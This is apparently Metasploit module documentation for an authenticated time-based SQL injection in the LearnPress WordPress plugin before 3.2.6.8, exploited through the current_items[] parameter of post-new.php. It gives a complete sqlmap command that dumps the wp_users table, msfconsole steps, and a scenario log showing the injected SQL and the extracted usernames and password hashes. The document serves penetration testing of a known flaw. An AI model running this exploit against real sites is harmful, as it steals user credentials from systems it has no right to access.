## Vulnerable Application

LearnPress, a learning management plugin for WordPress,
prior to 3.2.6.8 is affected by an authenticated SQL injection via the
`current_items[]` parameter of the `post-new.php` page.

The plugin can be downloaded [here](https://downloads.wordpress.org/plugin/learnpress.3.2.6.7.zip)

This module slightly replicates sqlmap running as:

```
sqlmap -u 'http://<IP>/wp-admin/post-new.php?post_type=lp_order' --cookie '<cookie>' --data "type=lp_course&context=order-items&context_id=32&term=+test&paged=1&lp-ajax=modal_search_items&current_items[]=1" -p "current_items[]" --technique T -T wp_users -C user_login,user_pass --dump --dbms mysql
```

## Verification Steps

1. Install the plugin, use defaults
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/wp_learnpress_sqli`
4. Do: `set username <username>`
5. Do: `set password <password>`
6. Do: `run`
7. You should get the users and hashes returned.

## Options

### ACTION: List Users

This action lists `COUNT` users and password hashes.

## COUNT

If action `List Users` is selected (default), this is the number of users to enumerate.
The larger this list, the more time it will take.  Defaults to `3`.

### PASSWORD

The password for a user.

### USERNAME

The username for a user.

## Scenarios

### LearnPress 3.2.6.7 on Wordpress 5.4.4 on Ubuntu 20.04

```
resource (learnpress.rb)> use auxiliary/scanner/http/wp_learnpress_sqli
resource (learnpress.rb)> set rhosts 111.111.1.111
rhosts => 111.111.1.111
resource (learnpress.rb)> set username admin
username => admin
resource (learnpress.rb)> set password admin
password => admin
resource (learnpress.rb)> set verbose true
verbose => true
resource (learnpress.rb)> set count 3
count => 3
resource (learnpress.rb)> run
[*] Checking /wp-content/plugins/learnpress/readme.txt
[*] Found version 3.2.6.7 in the plugin
[+] Vulnerable version detected
[*] Enumerating Usernames and Password Hashes
[*] {SQLi} Executing (select group_concat(CKvFyxDg) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) CKvFyxDg from wp_users limit 3) wmnJO)
[*] {SQLi} Encoded to (select group_concat(CKvFyxDg) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0xd5,0)),ifnull(user_pass,repeat(0x49,0))) as binary) CKvFyxDg from wp_users limit 3) wmnJO)
[*] {SQLi} Time-based injection: expecting output of length 124
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 admin2      $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
 editor      $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_learnpress_sqli) > creds
Credentials
===========

host  origin         service  public  private                             realm  private_type        JtR Format
----  ------         -------  ------  -------                             -----  ------------        ----------
      111.111.1.111           admin   $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0         Nonreplayable hash  phpass
      111.111.1.111           editor  $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/         Nonreplayable hash  phpass
      111.111.1.111           admin2  $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1         Nonreplayable hash  phpass
```
